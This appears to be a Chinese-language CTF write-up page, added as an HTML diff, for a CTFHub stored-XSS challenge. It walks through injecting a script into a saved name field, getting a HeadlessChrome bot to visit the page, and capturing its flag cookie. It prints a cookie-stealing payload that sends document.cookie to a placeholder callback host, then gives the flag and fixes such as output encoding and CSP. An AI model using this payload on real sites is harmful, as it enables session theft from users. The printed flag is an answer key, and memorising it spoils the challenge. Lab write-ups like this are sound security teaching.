@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub XSS 存储型 Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 800px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">← 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - XSS - 存储型</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># XSS</span>
+            <span class="tag"># 存储型</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>XSS Persistent（存储型 XSS）</li>
+            <li><strong>题目方向：</strong>Web - XSS - 存储型</li>
+            <li><strong>题目环境：</strong>动态分配的 HTTP 服务地址</li>
+            <li><strong>题目目标：</strong>利用持久化脚本窃取 Bot Cookie 中的 Flag。</li>
+        </ul>
+
+        <h2>二、漏洞分析</h2>
+        <p>页面提供 <code>Change name</code> 表单，通过 <code>POST</code> 提交 <code>name</code> 参数。提交后的名称会由服务端保存，并在后续访问首页时直接拼接到 HTML 中：</p>
+        <pre>&lt;h1&gt;Hello, &lt;b&gt;test123&lt;/b&gt;
+&lt;/h1&gt;</pre>
+        <p>输入未经过 HTML 实体编码，服务端会原样返回用户提交的标签。写入 <code>&lt;script&gt;...&lt;/script&gt;</code> 后再次访问首页，脚本会随页面加载执行，因此存在存储型 XSS。</p>
+        <p>页面底部的 <code>Send URL to Bot</code> 会将指定 URL 提交到 <code>/submit</code>。Bot 使用 HeadlessChrome 访问该页面，其 Cookie 中包含 Flag。由于会话 Cookie <code>koa.sess</code> 设置了 <code>HttpOnly</code>，真正可被脚本读取的是 <code>flag</code> Cookie。</p>
+
+        <h2>三、解题步骤</h2>
+        <ol>
+            <li>
+                <strong>写入 XSS Payload：</strong>向首页提交包含外带脚本的名称：
+                <pre>&lt;script&gt;new Image().src='https://your-callback.example/?c='+encodeURIComponent(document.cookie)&lt;/script&gt;</pre>
+                使用 <code>Image</code> 发起 GET 请求，可以避免页面跳转，并将 Cookie 作为查询参数发送到回调地址。
+            </li>
+            <li>
+                <strong>确认持久化回显：</strong>再次访问首页，响应中包含未编码的 <code>&lt;script&gt;</code>：
+                <pre>&lt;h1&gt;Hello, &lt;script&gt;new Image().src='...'+encodeURIComponent(document.cookie)&lt;/script&gt;
+&lt;/h1&gt;</pre>
+            </li>
+            <li>
+                <strong>触发 Bot：</strong>把首页 URL 提交给 <code>/submit</code>：
+                <pre>POST /submit
+Content-Type: application/json
+
+{"url":"http://challenge-xxx.sandbox.ctfhub.com:10800/"}</pre>
+                接口成功返回：
+                <pre>{
+  "code": 0,
+  "msg": "Successfully"
+}</pre>
+            </li>
+            <li>
+                <strong>读取回调数据：</strong>Bot 加载首页后执行存储的脚本，回调服务收到：
+                <pre>GET /?c=flag%3Dctfhub%7B9b7ebd561f467e3f821091e0%7D</pre>
+                URL 解码后即可得到 <code>flag=ctfhub{9b7ebd561f467e3f821091e0}</code>。
+            </li>
+        </ol>
+
+        <h2>四、最终 Flag</h2>
+        <div class="flag-box">
+            ctfhub{9b7ebd561f467e3f821091e0}
+        </div>
+
+        <h2>五、解题总结</h2>
+        <ul>
+            <li><strong>存储型风险：</strong>恶意输入被持久化并进入正常页面响应，任何访问页面的高权限用户都会触发脚本。</li>
+            <li><strong>外带方式：</strong>Bot 环境无法直接查看弹窗，需使用可访问的公网回调地址接收 Cookie。</li>
+            <li><strong>Cookie 限制：</strong><code>HttpOnly</code> Cookie 无法被 JavaScript 读取，但未设置该属性的 Flag Cookie 可以正常外带。</li>
+            <li><strong>修复建议：</strong>按输出上下文执行 HTML 实体编码，禁止直接拼接不可信输入，并部署 CSP 限制脚本和数据外带。</li>
+        </ul>
+    </div>
+</body>
+</html>
